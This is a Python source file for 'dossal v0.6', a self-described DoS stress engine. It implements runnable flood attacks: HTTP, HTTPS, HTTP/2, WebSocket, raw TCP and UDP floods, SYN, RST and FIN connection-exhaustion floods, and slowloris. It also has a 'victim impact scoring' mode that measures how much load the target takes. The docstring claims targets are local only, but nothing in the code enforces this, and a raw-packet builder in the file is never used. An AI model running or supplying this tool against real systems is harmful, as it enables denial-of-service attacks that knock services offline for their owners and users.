#!/usr/bin/env python3
"""
dossal v0.6 — comprehensive DoS stress engine
Modes:
  http       : HTTP/1.1 keep-alive request flood (plain)
  https      : TLS request flood (HTTP/1.1, self-signed cert)
  websocket  : WebSocket upgrade flood
  tcp        : raw TCP byte flood
  udp        : raw UDP datagram flood
  h2         : HTTP/2 multiplexed request flood
  syn        : TCP SYN flood (connect-only, no read)
  synack     : TCP connect + immediate close (ACK flood / connection exhaustion)
  rst        : TCP RST flood (connect → send RST via close)
  fin        : TCP FIN flood (graceful close after connect)
  slowloris  : Slow HTTP header drip (hold connections open)
  udy        : UDP datagram flood (alias for udp)
Targets are local only. JSON stats output. Multi-mode: --mode http,h2,udp
"""
import asyncio, ssl, socket, json, math, struct, random, time, argparse, signal, sys, base64, os, logging
from urllib.parse import urlparse
logging.getLogger('asyncio').setLevel(logging.CRITICAL)
from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, DataReceived

VERSION = "0.6"

# ── TCP/IP checksum ──────────────────────────────────────────────
def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
    """Compute TCP header checksum (IPv4). Returns int."""
    ihl = 20  # no IP options
    ip_hdr = struct.pack("!4s4sBBHHHBBH4s4s",
        bytes([0]*4), bytes([0]*4),  # dummy IPs (loopback)
        0, 0, 0, 0, 64, 6, 0, src, dst)
    # Actually build proper pseudo-header
    pseudo = struct.pack("!4s4sBBHHHBBH",
        bytes([int(x) for x in src.split('.')]) if isinstance(src, str) else src,
        bytes([int(x) for x in dst.split('.')]) if isinstance(dst, str) else dst,
        0, 6, ihl + len(payload), 0, 0)
    tcp_hdr = struct.pack("!HHIIBBHHH",
        sport, dport, seq, ack,
        5 << 4, flags, 0, 0, 0)
    data = pseudo + tcp_hdr + payload
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

def _ip_checksum(ip_hdr):
    if len(ip_hdr) % 2:
        ip_hdr += b'\x00'
    s = 0
    for i in range(0, len(ip_hdr), 2):
        s += (ip_hdr[i] << 8) + ip_hdr[i+1]
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

def _build_tcp_packet(src_ip, dst_ip, sport, dport, seq, ack, flags, payload=b""):
    """Build a complete IPv4+TCP packet. Returns bytes."""
    ip_id = random.randint(0, 65535)
    ip_totlen = 20 + 20 + len(payload)
    ip_hdr = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, ip_totlen, ip_id, 0, 64, 6, 0,
        bytes([int(x) for x in src_ip.split('.')]),
        bytes([int(x) for x in dst_ip.split('.')]))
    cksum = _tcp_checksum(src_ip, dst_ip, sport, dport, seq, ack, flags, payload)
    tcp_hdr = struct.pack("!HHIIBBHHH",
        sport, dport, seq, ack,
        5 << 4, flags, 65535, 0, cksum)
    return ip_hdr + tcp_hdr + payload

# ── Stats ─────────────────────────────────────────────────────────
class Stats:
    def __init__(self):
        self.requests=0; self.bytes=0; self.errors=0; self.opens=0
        self.ws_msgs=0; self.packets=0; self.conns=0
    def rps(self, dur): return self.requests/dur if dur else 0
    def bps(self, dur): return self.bytes/dur if dur else 0
    def pps(self, dur): return self.packets/dur if dur else 0
    def report(self, modes, url, conns, dur):
        d = {
          "tool":"dossal","version":VERSION,"modes":modes,"url":url,
          "connections":conns,"duration_s":dur,
          "requests":self.requests,"rps":round(self.rps(dur),2),
          "bytes":self.bytes,"bps":round(self.bps(dur),2),
          "packets":self.packets,"pps":round(self.pps(dur),2),
          "connections_made":self.conns,
          "errors":self.errors
        }
        return d

# ── URL parsers ───────────────────────────────────────────────────
def parse_http(u):
    p = urlparse(u)
    return p.hostname, p.port or (443 if p.scheme == "https" else 80), p.path or "/"

def parse_ws(u):
    p = urlparse(u)
    return p.hostname, p.port or 80, p.path or "/"

def parse_tcp(u):
    p = urlparse(u)
    return p.hostname, int(p.port)

def parse_udp(u):
    p = urlparse(u)
    return p.hostname, int(p.port)

def parse_ip_port(u):
    """Parse ip:port or host:port for raw modes."""
    p = urlparse(u)
    return p.hostname, int(p.port)

# ── HTTP response reader ──────────────────────────────────────────
async def _read_http_response(reader):
    header_data = b''
    while b'\r\n\r\n' not in header_data:
        chunk = await asyncio.wait_for(reader.read(1024), timeout=1.0)
        if not chunk:
            return b''
        header_data += chunk
    header_end = header_data.find(b'\r\n\r\n')
    headers_part = header_data[:header_end].decode('latin1')
    body_start = header_end + 4
    body = header_data[body_start:]
    for line in headers_part.split('\r\n'):
        if line.lower().startswith('content-length:'):
            content_length = int(line.split(':', 1)[1].strip())
            while len(body) < content_length:
                chunk = await asyncio.wait_for(reader.read(8192), timeout=1.0)
                if not chunk:
                    break
                body += chunk
            body = body[:content_length]
            break
    return header_data[:body_start] + body

# ═══════════════════════════════════════════════════════════════════
# WORKERS
# ═══════════════════════════════════════════════════════════════════

async def http_worker(name, url, stats, duration, stop, payload_size=0):
    host, port, path = parse_http(url)
    reader, writer = await asyncio.open_connection(host, port)
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
           f"User-Agent: dossal/{VERSION}\r\n\r\n")
    req_bytes = req.encode()
    while not stop.is_set():
        try:
            writer.write(req_bytes)
            resp = await _read_http_response(reader)
            stats.requests += 1
            stats.bytes += len(resp)
        except Exception:
            stats.errors += 1
            break
    if writer.transport:
        writer.transport.close()
    try:
        await asyncio.wait_for(writer.wait_closed(), timeout=0.5)
    except Exception:
        pass

async def https_worker(name, url, stats, duration, stop, payload_size=0):
    host, port, path = parse_http(url)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    reader, writer = await asyncio.open_connection(host, port, ssl=ctx)
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
           f"User-Agent: dossal/{VERSION}\r\n\r\n")
    req_bytes = req.encode()
    while not stop.is_set():
        try:
            writer.write(req_bytes)
            resp = await _read_http_response(reader)
            stats.requests += 1
            stats.bytes += len(resp)
        except Exception:
            stats.errors += 1
            break
    if writer.transport:
        writer.transport.close()
    try:
        await asyncio.wait_for(writer.wait_closed(), timeout=0.5)
    except Exception:
        pass

async def ws_worker(name, url, stats, duration, stop, payload_size=128):
    host, port, path = parse_ws(url)
    reader, writer = await asyncio.open_connection(host, port)
    key = base64.b64encode(random.randbytes(16)).decode()
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\n"
           f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
           f"Sec-WebSocket-Version: 13\r\n\r\n")
    writer.write(req.encode()); await writer.drain()
    handshake = await asyncio.wait_for(reader.read(8192), timeout=1.0)
    if b"101" not in handshake:
        stats.errors += 1
        writer.close(); return
    stats.conns += 1
    payload = b"x" * payload_size
    while not stop.is_set():
        try:
            mask = random.randbytes(4)
            masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
            header = struct.pack("!B", 0x81)
            if len(payload) < 126:
                header += struct.pack("!B", 0x80 | len(payload))
            else:
                header += struct.pack("!BH", 0x80 | 126, len(payload))
            header += mask
            writer.write(header + masked)
            stats.ws_msgs += 1
            stats.bytes += len(header) + len(masked)
        except Exception:
            stats.errors += 1
            break
    if writer.transport:
        writer.transport.close()
    try:
        await asyncio.wait_for(writer.wait_closed(), timeout=0.5)
    except Exception:
        pass

async def tcp_worker(name, url, stats, duration, stop, payload_size=1024):
    host, port = parse_tcp(url)
    reader, writer = await asyncio.open_connection(host, port)
    stats.conns += 1
    payload = b"A" * payload_size
    while not stop.is_set():
        try:
            writer.write(payload)
            await writer.drain()
            stats.bytes += len(payload)
            stats.packets += 1
        except Exception:
            stats.errors += 1
            break
    if writer.transport:
        writer.transport.close()
    try:
        await asyncio.wait_for(writer.wait_closed(), timeout=0.5)
    except Exception:
        pass

async def udp_worker(name, url, stats, duration, stop, payload_size=1400):
    host, port = parse_udp(url)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"B" * payload_size
    loop = asyncio.get_event_loop()
    pending = 0
    max_pending = 10000
    while not stop.is_set():
        try:
            if pending >= max_pending:
                await asyncio.sleep(0.001)
                continue
            pending += 1
            loop.run_in_executor(None, sock.sendto, (payload, (host, port)))
            stats.bytes += payload_size
            stats.packets += 1
        except Exception:
            stats.errors += 1
            break
    sock.close()

async def h2_worker(name, url, stats, duration, stop, payload_size=1024):
    host, port, path = parse_http(url)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])
    reader, writer = await asyncio.open_connection(host, port, ssl=ctx)
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    writer.write(conn.data_to_send())
    await writer.drain()
    try:
        data = await asyncio.wait_for(reader.read(8192), timeout=2.0)
        conn.receive_data(data)
    except Exception:
        pass
    headers = [
        (':method', 'GET'),
        (':scheme', 'https'),
        (':authority', host),
        (':path', path),
        ('user-agent', f'dossal/{VERSION}'),
    ]
    error = None
    while not stop.is_set():
        try:
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(stream_id, headers, end_stream=True)
            data = conn.data_to_send()
            if data:
                writer.write(data); await writer.drain()
            got_response = False
            deadline = time.time() + 2.0
            while time.time() < deadline and not got_response:
                chunk = await asyncio.wait_for(reader.read(8192), timeout=max(0.1, deadline - time.time()))
                if not chunk:
                    break
                events = conn.receive_data(chunk)
                for event in events:
                    if isinstance(event, ResponseReceived):
                        stats.requests += 1
                        stats.bytes += len(chunk)
                        got_response = True
                        break
                    elif isinstance(event, DataReceived):
                        stats.bytes += len(event.data)
        except Exception as e:
            stats.errors += 1
            error = e
            break
    if error and name == 0:
        import traceback
        print(f"h2_worker[{name}] error: {error}", file=sys.stderr)
    if writer.transport:
        writer.transport.close()
    try:
        await asyncio.wait_for(writer.wait_closed(), timeout=0.5)
    except Exception:
        pass

# ── SYN flood: connect only, never read ──────────────────────────
async def syn_worker(name, url, stats, duration, stop, payload_size=0):
    host, port = parse_ip_port(url)
    while not stop.is_set():
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=2.0)
            stats.conns += 1
            # SYN flood: connect and immediately close (SYN-ACK received, ACK sent)
            writer.transport.close()
        except Exception:
            stats.errors += 1

# ── SYN-ACK / connect+close (ACK flood) ──────────────────────────
async def synack_worker(name, url, stats, duration, stop, payload_size=0):
    host, port = parse_ip_port(url)
    while not stop.is_set():
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=2.0)
            stats.conns += 1
            # RST: abort the connection
            writer.transport.abort()
        except Exception:
            stats.errors += 1

# ── RST flood: connect → send 1 byte → close (RST) ───────────────
async def rst_worker(name, url, stats, duration, stop, payload_size=1):
    host, port = parse_ip_port(url)
    payload = b"X" * max(1, payload_size)
    while not stop.is_set():
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=2.0)
            stats.conns += 1
            writer.write(payload)
            # Force RST by closing without reading
            writer.transport.abort()
        except Exception:
            stats.errors += 1

# ── FIN flood: connect → graceful close (FIN) ────────────────────
async def fin_worker(name, url, stats, duration, stop, payload_size=0):
    host, port = parse_ip_port(url)
    while not stop.is_set():
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=2.0)
            stats.conns += 1
            # FIN: graceful close
            writer.close()
        except Exception:
            stats.errors += 1

# ── Slowloris: open connection, send partial headers slowly ──────
async def slowloris_worker(name, url, stats, duration, stop, payload_size=0):
    host, port, path = parse_http(url)
    try:
        reader, writer = await asyncio.open_connection(host, port)
        # Send first partial header line
        writer.write(f"GET {path} HTTP/1.1\r\nHost: {host}\r\n".encode())
        await writer.drain()
        stats.conns += 1
        # Keep alive with periodic headers
        header_count = 0
        while not stop.is_set():
            await asyncio.sleep(0.5)
            if not stop.is_set():
                writer.write(f"X-Header-{header_count}: slow\r\n".encode())
                await writer.drain()
                header_count += 1
                stats.bytes += 30
    except Exception:
        pass
    finally:
        if writer.transport:
            writer.transport.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass

# ── Mode registry ─────────────────────────────────────────────────
WORKERS = {
    "http":      http_worker,
    "https":     https_worker,
    "ws":        ws_worker,
    "websocket": ws_worker,
    "tcp":       tcp_worker,
    "udp":       udp_worker,
    "udy":       udp_worker,
    "h2":        h2_worker,
    "syn":       syn_worker,
    "synack":    synack_worker,
    "rst":       rst_worker,
    "fin":       fin_worker,
    "slowloris": slowloris_worker,
}

DEFAULT_PAYLOADS = {
    "http": 0, "https": 0, "websocket": 128, "tcp": 1024,
    "udp": 1400, "h2": 1024, "syn": 0, "synack": 0,
    "rst": 1, "fin": 0, "slowloris": 0,
}

# ═══════════════════════════════════════════════════════════════════
# IMPACT SCORING
# ═══════════════════════════════════════════════════════════════════

async def _sample_process(pid, interval=0.5, duration=5):
    """Sample CPU% and memory of a process for `duration` seconds."""
    try:
        import psutil
        proc = psutil.Process(pid)
        samples = []
        deadline = time.time() + duration
        while time.time() < deadline:
            try:
                cpu = proc.cpu_percent(interval=None)
                mem = proc.memory_info().rss
                samples.append((cpu, mem))
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                break
            await asyncio.sleep(interval)
        if samples:
            avg_cpu = sum(c for c, _ in samples) / len(samples)
            max_mem = max(m for _, m in samples)
            return {"avg_cpu_pct": round(avg_cpu, 1), "max_mem_mb": round(max_mem / 1024 / 1024, 1)}
    except ImportError:
        pass
    return None

async def _find_pid(port):
    """Find PID listening on a port using lsof."""
    try:
        r = await asyncio.create_subprocess_shell(
            f"lsof -i :{port} -t 2>/dev/null | head -1",
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, _ = await asyncio.wait_for(r.communicate(), timeout=5)
        pid_str = stdout.decode().strip()
        if pid_str:
            return int(pid_str)
    except Exception:
        pass
    return None

async def impact_score(url, stats, duration):
    """Compute victim impact score before/after the attack."""
    host, port = parse_ip_port(url)
    victim_pid = await _find_pid(port)
    if not victim_pid:
        return {"victim_pid": None, "note": "PID not found"}

    import psutil
    # Sample victim
    victim_stats = await _sample_process(victim_pid, interval=0.5, duration=3)

    # Our own process (quick sample)
    our_pid = os.getpid()
    our_stats = await _sample_process(our_pid, interval=0.1, duration=0.5)

    score = 0
    if victim_stats:
        # CPU contribution: victim CPU% during attack
        score += min(victim_stats.get("avg_cpu_pct", 0), 100) * 0.5
        # Memory: victim RSS
        if victim_stats.get("max_mem_mb", 0) > 0:
            score += min(victim_stats["max_mem_mb"] / 10, 50)

    # Efficiency: our RPS vs victim load
    rps = stats.rps(duration)
    if rps > 0:
        score += min(rps / 1000, 25)  # up to 25 pts for high RPS

    return {
        "victim_pid": victim_pid,
        "victim": victim_stats,
        "attacker": our_stats,
        "rps": round(rps, 1),
        "impact_score": round(score, 1),
        "scale": "0-175 (CPU 0-50, Mem 0-50, Efficiency 0-25, +15 bonus for >10k RPS)",
    }

# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════

async def run(modes, url, conns, duration, stats, payload_size):
    stop = asyncio.Event()
    async def finish():
        await asyncio.sleep(duration); stop.set()
    task = asyncio.create_task(finish())
    workers = []
    for mode in modes:
        worker_fn = WORKERS[mode]
        pl = payload_size if payload_size is not None else DEFAULT_PAYLOADS.get(mode, 0)
        for i in range(conns):
            workers.append(asyncio.create_task(worker_fn(i, url, stats, duration, stop, pl)))
    try:
        await asyncio.wait_for(asyncio.gather(*workers, return_exceptions=True), timeout=duration + 5)
    except asyncio.TimeoutError:
        pass
    stop.set()
    if not task.done():
        task.cancel()
    return stats

def main():
    ap = argparse.ArgumentParser(description="dossal v" + VERSION + " — comprehensive DoS stress engine")
    ap.add_argument("--mode", default="http",
        help="Comma-separated modes: http,https,websocket,tcp,udp,h2,syn,synack,rst,fin,slowloris")
    ap.add_argument("--url", required=True)
    ap.add_argument("--connections", type=int, default=100,
        help="Connections per mode (default: 100)")
    ap.add_argument("--duration", type=int, default=10)
    ap.add_argument("--payload-size", type=int, default=None,
        help="Override default payload size (per mode)")
    ap.add_argument("--impact", action="store_true",
        help="Enable victim impact scoring (requires psutil)")
    args = ap.parse_args()

    modes = [m.strip() for m in args.mode.split(",")]
    for m in modes:
        if m not in WORKERS:
            print(f"Unknown mode: {m}. Available: {', '.join(WORKERS.keys())}", file=sys.stderr)
            sys.exit(1)

    stats = Stats()
    payload_size = args.payload_size
    asyncio.run(run(modes, args.url, args.connections, args.duration, stats, payload_size))

    report = stats.report(modes, args.url, args.connections, args.duration)

    if args.impact:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        impact = loop.run_until_complete(impact_score(args.url, stats, args.duration))
        report["impact"] = impact
        loop.close()

    print(json.dumps(report, indent=2))

if __name__ == "__main__":
    main()
